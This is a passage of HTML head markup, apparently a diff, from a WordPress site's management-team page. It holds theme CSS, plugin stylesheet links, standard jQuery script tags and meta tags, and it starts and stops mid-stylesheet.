.has-ast-global-color-4-background-color{background-color:var(--ast-global-color-4);}:root .has-ast-global-color-5-color{color:var(--ast-global-color-5);}:root .has-ast-global-color-5-background-color{background-color:var(--ast-global-color-5);}:root .wp-block-button .has-ast-global-color-5-color{color:var(--ast-global-color-5);}:root .wp-block-button .has-ast-global-color-5-background-color{background-color:var(--ast-global-color-5);}:root .has-ast-global-color-6-color{color:var(--ast-global-color-6);}:root .has-ast-global-color-6-background-color{background-color:var(--ast-global-color-6);}:root .wp-block-button .has-ast-global-color-6-color{color:var(--ast-global-color-6);}:root .wp-block-button .has-ast-global-color-6-background-color{background-color:var(--ast-global-color-6);}:root .has-ast-global-color-7-color{color:var(--ast-global-color-7);}:root .has-ast-global-color-7-background-color{background-color:var(--ast-global-color-7);}:root .wp-block-button .has-ast-global-color-7-color{color:var(--ast-global-color-7);}:root .wp-block-button .has-ast-global-color-7-background-color{background-color:var(--ast-global-color-7);}:root .has-ast-global-color-8-color{color:var(--ast-global-color-8);}:root .has-ast-global-color-8-background-color{background-color:var(--ast-global-color-8);}:root .wp-block-button .has-ast-global-color-8-color{color:var(--ast-global-color-8);}:root .wp-block-button .has-ast-global-color-8-background-color{background-color:var(--ast-global-color-8);}:root{--ast-global-color-0:#0170B9;--ast-global-color-1:#3a3a3a;--ast-global-color-2:#3a3a3a;--ast-global-color-3:#4B4F58;--ast-global-color-4:#F5F5F5;--ast-global-color-5:#FFFFFF;--ast-global-color-6:#E5E5E5;--ast-global-color-7:#424242;--ast-global-color-8:#000000;}:root {--ast-border-color : #dddddd;}.ast-single-entry-banner {-js-display: flex;display: flex;flex-direction: column;justify-content: center;text-align: center;position: relative;background: #eeeeee;}.ast-single-entry-banner[data-banner-layout="layout-1"] {max-width: 1200px;background: inherit;padding: 20px 0;}.ast-single-entry-banner[data-banner-width-type="custom"] {margin: 0 auto;width: 100%;}.ast-single-entry-banner + .site-content .entry-header {margin-bottom: 0;}header.entry-header .entry-title{font-size:30px;font-size:1.875rem;}header.entry-header > *:not(:last-child){margin-bottom:10px;}.ast-archive-entry-banner {-js-display: flex;display: flex;flex-direction: column;justify-content: center;text-align: center;position: relative;background: #eeeeee;}.ast-archive-entry-banner[data-banner-width-type="custom"] {margin: 0 auto;width: 100%;}.ast-archive-entry-banner[data-banner-layout="layout-1"] {background: inherit;padding: 20px 0;text-align: left;}body.archive .ast-archive-description{max-width:1200px;width:100%;text-align:left;padding-top:3em;padding-right:3em;padding-bottom:3em;padding-left:3em;}body.archive .ast-archive-description .ast-archive-title,body.archive .ast-archive-description .ast-archive-title *{font-size:40px;font-size:2.5rem;}body.archive .ast-archive-description > *:not(:last-child){margin-bottom:10px;}@media (max-width:921px){body.archive .ast-archive-description{text-align:left;}}@media (max-width:544px){body.archive .ast-archive-description{text-align:left;}}@media (min-width:921px){.ast-theme-transparent-header #masthead{position:absolute;left:0;right:0;}.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar{background:none;}body.elementor-editor-active.ast-theme-transparent-header #masthead,.fl-builder-edit .ast-theme-transparent-header #masthead,body.vc_editor.ast-theme-transparent-header #masthead,body.brz-ed.ast-theme-transparent-header #masthead{z-index:0;}.ast-header-break-point.ast-replace-site-logo-transparent.ast-theme-transparent-header .custom-mobile-logo-link{display:none;}.ast-header-break-point.ast-replace-site-logo-transparent.ast-theme-transparent-header .transparent-custom-logo{display:inline-block;}.ast-theme-transparent-header .ast-above-header,.ast-theme-transparent-header .ast-above-header.ast-above-header-bar{background-image:none;background-color:transparent;}.ast-theme-transparent-header .ast-below-header{background-image:none;background-color:transparent;}}.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-menu,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .ast-mobile-header-wrap .main-header-bar{background-color:#02003b;}.ast-theme-transparent-header .main-header-bar .ast-search-menu-icon form{background-color:#02003b;}.ast-theme-transparent-header .ast-above-header,.ast-theme-transparent-header .ast-above-header.ast-above-header-bar,.ast-theme-transparent-header .ast-below-header,.ast-header-break-point.ast-theme-transparent-header .ast-above-header,.ast-header-break-point.ast-theme-transparent-header .ast-below-header{background-color:#02003b;}.ast-theme-transparent-header .site-title a,.ast-theme-transparent-header .site-title a:focus,.ast-theme-transparent-header .site-title a:hover,.ast-theme-transparent-header .site-title a:visited{color:#ffffff;}.ast-theme-transparent-header .site-header .site-title a:hover{color:rgba(255,255,255,0.8);}.ast-theme-transparent-header .site-header .site-description{color:#ffffff;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .ast-builder-menu .main-header-bar-navigation .main-header-menu .menu-item .sub-menu,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .ast-builder-menu .main-header-bar-navigation [CLASS*="ast-builder-menu-"] .main-header-menu .menu-item .sub-menu,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-link,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .ast-builder-menu .main-header-bar-navigation .main-header-menu .menu-item .sub-menu .menu-link,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .ast-builder-menu .main-header-bar-navigation [CLASS*="ast-builder-menu-"] .main-header-menu .menu-item .sub-menu .menu-link,.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .main-header-bar-navigation .main-header-menu .menu-item .sub-menu .menu-link,.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .main-header-bar-navigation .main-header-menu .menu-item .sub-menu{background-color:#0a0a0a;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item .sub-menu .menu-item > .ast-menu-toggle,.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-link,.ast-header-break-point.ast-flyout-menu-enable.ast-header-break-point .main-header-bar-navigation .main-header-menu .menu-item .sub-menu .menu-link{color:#ffffff;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .menu-item > .menu-link,.ast-theme-transparent-header .ast-masthead-custom-menu-items,.ast-theme-transparent-header .ast-masthead-custom-menu-items a,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-above-header-navigation a,.ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation a,.ast-header-break-point.ast-theme-transparent-header .ast-above-header-navigation > ul.ast-above-header-menu > .menu-item-has-children:not(.current-menu-item) > .ast-menu-toggle,.ast-theme-transparent-header .ast-below-header-menu,.ast-theme-transparent-header .ast-below-header-menu a,.ast-header-break-point.ast-theme-transparent-header .ast-below-header-menu a,.ast-header-break-point.ast-theme-transparent-header .ast-below-header-menu,.ast-theme-transparent-header .main-header-menu .menu-link{color:#ffffff;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .ast-masthead-custom-menu-items a:hover,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .ast-menu-toggle,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .ast-menu-toggle,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .ast-menu-toggle,.ast-theme-transparent-header .main-header-menu .menu-item:hover > .menu-link,.ast-theme-transparent-header .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header .main-header-menu .current-menu-ancestor > .menu-link{color:#dd3333;}@media (max-width:921px){.ast-theme-transparent-header #masthead{position:absolute;left:0;right:0;}.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar{background:none;}body.elementor-editor-active.ast-theme-transparent-header #masthead,.fl-builder-edit .ast-theme-transparent-header #masthead,body.vc_editor.ast-theme-transparent-header #masthead,body.brz-ed.ast-theme-transparent-header #masthead{z-index:0;}.ast-header-break-point.ast-replace-site-logo-transparent.ast-theme-transparent-header .custom-mobile-logo-link{display:none;}.ast-header-break-point.ast-replace-site-logo-transparent.ast-theme-transparent-header .transparent-custom-logo{display:inline-block;}.ast-theme-transparent-header .ast-above-header,.ast-theme-transparent-header .ast-above-header.ast-above-header-bar{background-image:none;background-color:transparent;}.ast-theme-transparent-header .ast-below-header{background-image:none;background-color:transparent;}}@media (max-width:921px){.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-menu,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .ast-mobile-header-wrap .main-header-bar{background-color:#02003b;}.ast-theme-transparent-header .main-header-bar .ast-search-menu-icon form{background-color:#02003b;}.ast-theme-transparent-header .ast-above-header,.ast-theme-transparent-header .ast-above-header.ast-above-header-bar,.ast-theme-transparent-header .ast-below-header,.ast-header-break-point.ast-theme-transparent-header .ast-above-header,.ast-header-break-point.ast-theme-transparent-header .ast-below-header{background-color:#02003b;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .menu-item > .menu-link,.ast-theme-transparent-header .ast-masthead-custom-menu-items,.ast-theme-transparent-header .ast-masthead-custom-menu-items a,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item > .ast-menu-toggle,.ast-theme-transparent-header .main-header-menu .menu-link{color:#5a5a5a;}.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .menu-item:hover > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .ast-masthead-custom-menu-items a:hover,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .focus > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .menu-link,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-item > .ast-menu-toggle,.ast-theme-transparent-header .ast-builder-menu .main-header-menu .current-menu-ancestor > .ast-menu-toggle,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .menu-link,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-item > .ast-menu-toggle,.ast-theme-transparent-header [CLASS*="ast-builder-menu-"] .main-header-menu .current-menu-ancestor > .ast-menu-toggle,.ast-theme-transparent-header .main-header-menu .menu-item:hover > .menu-link,.ast-theme-transparent-header .main-header-menu .current-menu-item > .menu-link,.ast-theme-transparent-header .main-header-menu .current-menu-ancestor > .menu-link{color:#0c65ed;}}@media (max-width:544px){.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-menu,.ast-theme-transparent-header.ast-header-break-point .main-header-bar-wrap .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .ast-mobile-header-wrap .main-header-bar{background-color:#02003b;}.ast-theme-transparent-header .main-header-bar .ast-search-menu-icon form{background-color:#02003b;}.ast-theme-transparent-header .ast-above-header,.ast-theme-transparent-header .ast-above-header.ast-above-header-bar,.ast-theme-transparent-header .ast-below-header,.ast-header-break-point.ast-theme-transparent-header .ast-above-header,.ast-header-break-point.ast-theme-transparent-header .ast-below-header{background-color:#02003b;}}.ast-theme-transparent-header .main-header-bar,.ast-theme-transparent-header.ast-header-break-point .main-header-bar{border-bottom-width:6px;border-bottom-style:solid;border-bottom-color:#ff0044;}.ast-breadcrumbs .trail-browse,.ast-breadcrumbs .trail-items,.ast-breadcrumbs .trail-items li{display:inline-block;margin:0;padding:0;border:none;background:inherit;text-indent:0;}.ast-breadcrumbs .trail-browse{font-size:inherit;font-style:inherit;font-weight:inherit;color:inherit;}.ast-breadcrumbs .trail-items{list-style:none;}.trail-items li::after{padding:0 0.3em;content:"\00bb";}.trail-items li:last-of-type::after{display:none;}h1,.entry-content h1,h2,.entry-content h2,h3,.entry-content h3,h4,.entry-content h4,h5,.entry-content h5,h6,.entry-content h6{color:#1a1a1a;}.elementor-widget-heading .elementor-heading-title{margin:0;}.elementor-page .ast-menu-toggle{color:unset !important;background:unset !important;}.elementor-post.elementor-grid-item.hentry{margin-bottom:0;}.woocommerce div.product .elementor-element.elementor-products-grid .related.products ul.products li.product,.elementor-element .elementor-wc-products .woocommerce[class*='columns-'] ul.products li.product{width:auto;margin:0;float:none;}.ast-left-sidebar .elementor-section.elementor-section-stretched,.ast-right-sidebar .elementor-section.elementor-section-stretched{max-width:100%;left:0 !important;}.elementor-template-full-width .ast-container{display:block;}@media (max-width:544px){.elementor-element .elementor-wc-products .woocommerce[class*="columns-"] ul.products li.product{width:auto;margin:0;}.elementor-element .woocommerce .woocommerce-result-count{float:none;}}.ast-header-break-point .main-header-bar{border-bottom-width:1px;border-bottom-color:rgba(0,0,0,0.1);}@media (min-width:922px){.main-header-bar{border-bottom-width:1px;border-bottom-color:rgba(0,0,0,0.1);}}.ast-flex{-webkit-align-content:center;-ms-flex-line-pack:center;align-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;}.main-header-bar{padding:1em 0;}.ast-site-identity{padding:0;}.header-main-layout-1 .ast-flex.main-header-container, .header-main-layout-3 .ast-flex.main-header-container{-webkit-align-content:center;-ms-flex-line-pack:center;align-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;}.header-main-layout-1 .ast-flex.main-header-container, .header-main-layout-3 .ast-flex.main-header-container{-webkit-align-content:center;-ms-flex-line-pack:center;align-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;}.main-header-menu .sub-menu .menu-item.menu-item-has-children > .menu-link:after{position:absolute;right:1em;top:50%;transform:translate(0,-50%) rotate(270deg);}.ast-header-break-point .main-header-bar .main-header-bar-navigation .page_item_has_children > .ast-menu-toggle::before, .ast-header-break-point .main-header-bar .main-header-bar-navigation .menu-item-has-children > .ast-menu-toggle::before, .ast-mobile-popup-drawer .main-header-bar-navigation .menu-item-has-children>.ast-menu-toggle::before, .ast-header-break-point .ast-mobile-header-wrap .main-header-bar-navigation .menu-item-has-children > .ast-menu-toggle::before{font-weight:bold;content:"\e900";font-family:Astra;text-decoration:inherit;display:inline-block;}.ast-header-break-point .main-navigation ul.sub-menu .menu-item .menu-link:before{content:"\e900";font-family:Astra;font-size:.65em;text-decoration:inherit;display:inline-block;transform:translate(0, -2px) rotateZ(270deg);margin-right:5px;}.widget_search .search-form:after{font-family:Astra;font-size:1.2em;font-weight:normal;content:"\e8b6";position:absolute;top:50%;right:15px;transform:translate(0, -50%);}.astra-search-icon::before{content:"\e8b6";font-family:Astra;font-style:normal;font-weight:normal;text-decoration:inherit;text-align:center;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;z-index:3;}.main-header-bar .main-header-bar-navigation .page_item_has_children > a:after, .main-header-bar .main-header-bar-navigation .menu-item-has-children > a:after, .site-header-focus-item .main-header-bar-navigation .menu-item-has-children > .menu-link:after{content:"\e900";display:inline-block;font-family:Astra;font-size:.6rem;font-weight:bold;text-rendering:auto;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;margin-left:10px;line-height:normal;}.ast-mobile-popup-drawer .main-header-bar-navigation .ast-submenu-expanded>.ast-menu-toggle::before{transform:rotateX(180deg);}.ast-header-break-point .main-header-bar-navigation .menu-item-has-children > .menu-link:after{display:none;}.ast-separate-container .blog-layout-1, .ast-separate-container .blog-layout-2, .ast-separate-container .blog-layout-3{background-color:transparent;background-image:none;}.ast-separate-container .ast-article-post{background-color:var(--ast-global-color-5);;}@media (max-width:921px){.ast-separate-container .ast-article-post{background-color:var(--ast-global-color-5);;}}@media (max-width:544px){.ast-separate-container .ast-article-post{background-color:var(--ast-global-color-5);;}}.ast-separate-container .ast-article-single:not(.ast-related-post), .ast-separate-container .comments-area .comment-respond,.ast-separate-container .comments-area .ast-comment-list li, .ast-separate-container .ast-woocommerce-container, .ast-separate-container .error-404, .ast-separate-container .no-results, .single.ast-separate-container  .ast-author-meta, .ast-separate-container .related-posts-title-wrapper, .ast-separate-container.ast-two-container #secondary .widget,.ast-separate-container .comments-count-wrapper, .ast-box-layout.ast-plain-container .site-content,.ast-padded-layout.ast-plain-container .site-content, .ast-separate-container .comments-area .comments-title, .ast-narrow-container .site-content{background-color:var(--ast-global-color-5);;}@media (max-width:921px){.ast-separate-container .ast-article-single:not(.ast-related-post), .ast-separate-container .comments-area .comment-respond,.ast-separate-container .comments-area .ast-comment-list li, .ast-separate-container .ast-woocommerce-container, .ast-separate-container .error-404, .ast-separate-container .no-results, .single.ast-separate-container  .ast-author-meta, .ast-separate-container .related-posts-title-wrapper, .ast-separate-container.ast-two-container #secondary .widget,.ast-separate-container .comments-count-wrapper, .ast-box-layout.ast-plain-container .site-content,.ast-padded-layout.ast-plain-container .site-content, .ast-separate-container .comments-area .comments-title, .ast-narrow-container .site-content{background-color:var(--ast-global-color-5);;}}@media (max-width:544px){.ast-separate-container .ast-article-single:not(.ast-related-post), .ast-separate-container .comments-area .comment-respond,.ast-separate-container .comments-area .ast-comment-list li, .ast-separate-container .ast-woocommerce-container, .ast-separate-container .error-404, .ast-separate-container .no-results, .single.ast-separate-container  .ast-author-meta, .ast-separate-container .related-posts-title-wrapper, .ast-separate-container.ast-two-container #secondary .widget,.ast-separate-container .comments-count-wrapper, .ast-box-layout.ast-plain-container .site-content,.ast-padded-layout.ast-plain-container .site-content, .ast-separate-container .comments-area .comments-title, .ast-narrow-container .site-content{background-color:var(--ast-global-color-5);;}}:root{--e-global-color-astglobalcolor0:#0170B9;--e-global-color-astglobalcolor1:#3a3a3a;--e-global-color-astglobalcolor2:#3a3a3a;--e-global-color-astglobalcolor3:#4B4F58;--e-global-color-astglobalcolor4:#F5F5F5;--e-global-color-astglobalcolor5:#FFFFFF;--e-global-color-astglobalcolor6:#E5E5E5;--e-global-color-astglobalcolor7:#424242;--e-global-color-astglobalcolor8:#000000;}
+/*# sourceURL=astra-theme-css-inline-css */
+</style>
+<link rel='stylesheet' id='astra-menu-animation-css' href='https://dgf.com.my/wp-content/themes/astra/assets/css/minified/menu-animation.min.css?ver=4.0.2' media='all' />
+<link rel='stylesheet' id='hfe-widgets-style-css' href='https://dgf.com.my/wp-content/plugins/header-footer-elementor/inc/widgets-css/frontend.css?ver=1.6.42' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<link rel='stylesheet' id='contact-form-7-css' href='https://dgf.com.my/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.9.8' media='all' />
+<link rel='stylesheet' id='astra-contact-form-7-css' href='https://dgf.com.my/wp-content/themes/astra/assets/css/minified/compatibility/contact-form-7-main.min.css?ver=4.0.2' media='all' />
+<link rel='stylesheet' id='powertip-css' href='https://dgf.com.my/wp-content/plugins/devvn-image-hotspot/frontend/css/jquery.powertip.min.css?ver=1.2.0' media='all' />
+<link rel='stylesheet' id='maps-points-css' href='https://dgf.com.my/wp-content/plugins/devvn-image-hotspot/frontend/css/maps_points.css?ver=1.2.8' media='all' />
+<link rel='stylesheet' id='hfe-style-css' href='https://dgf.com.my/wp-content/plugins/header-footer-elementor/assets/css/header-footer-elementor.css?ver=1.6.42' media='all' />
+<link rel='stylesheet' id='elementor-icons-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.31.0' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='swiper-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' media='all' />
+<link rel='stylesheet' id='e-swiper-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='elementor-post-1215-css' href='https://dgf.com.my/wp-content/uploads/elementor/css/post-1215.css?ver=1727975715' media='all' />
+<link rel='stylesheet' id='font-awesome-5-all-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='widget-icon-list-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/widget-icon-list.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='widget-text-editor-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.24.5' media='all' />
+<link rel='stylesheet' id='elementor-post-1733-css' href='https://dgf.com.my/wp-content/uploads/elementor/css/post-1733.css?ver=1727991301' media='all' />
+<link rel='stylesheet' id='elementor-post-1519-css' href='https://dgf.com.my/wp-content/uploads/elementor/css/post-1519.css?ver=1727975716' media='all' />
+<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.9.4' media='all' />
+<link rel='stylesheet' id='elementor-icons-shared-0-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' media='all' />
+<link rel='stylesheet' id='elementor-icons-fa-solid-css' href='https://dgf.com.my/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3' media='all' />
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script src="https://dgf.com.my/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://dgf.com.my/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="https://dgf.com.my/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.24.5" id="font-awesome-4-shim-js"></script>
+<link rel="https://api.w.org/" href="https://dgf.com.my/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://dgf.com.my/wp-json/wp/v2/pages/1733" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://dgf.com.my/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.9.4" />
+<link rel="canonical" href="https://dgf.com.my/management-team/" />
+<link rel='shortlink' href='https://dgf.com.my/?p=1733' />
+<meta name="generator" content="Elementor 3.24.5; features: additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-auto">
+<style>.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<link rel="icon" href="https://dgf.com.my/wp-content/uploads/2020/10/cropped-fav-02-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://dgf.com.my/wp-content/uploads/2020/10/cropped-fav-02-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://dgf.com.my/wp-content/uploads/2020/10/cropped-fav-02-180x180.png" />
+<meta name="msapplication-TileImage" content="https://dgf.com.my/wp-content/uploads/2020/10/cropped-fav-02-270x270.png" />
+		<style id="wp-custom-css">
+			.sub-menu{background-color:black !important}
+td, th {
+	border:none}		</style>
+		<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--ast-global-color-0: var(--ast-global-color-0);--wp--preset--color--ast-global-color-1: var(--ast-global-color-1);--wp--preset--color--ast-global-color-2: var(--ast-global-color-2);--wp--preset--color--ast-global-color-3: var(--ast-global-color-3);--wp--preset--color--ast-global-color-4: var(--ast-global-color-4);--wp--preset--color--ast-global-color-5: var(--ast-global-color-5);--wp--preset--color--ast-global-color-6: var(--ast-global-color-6);--wp--preset--color--ast-global-color-7: var(--ast-global-color-7);--wp--preset--color--ast-global-color-8: var(--ast-global-color-8);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 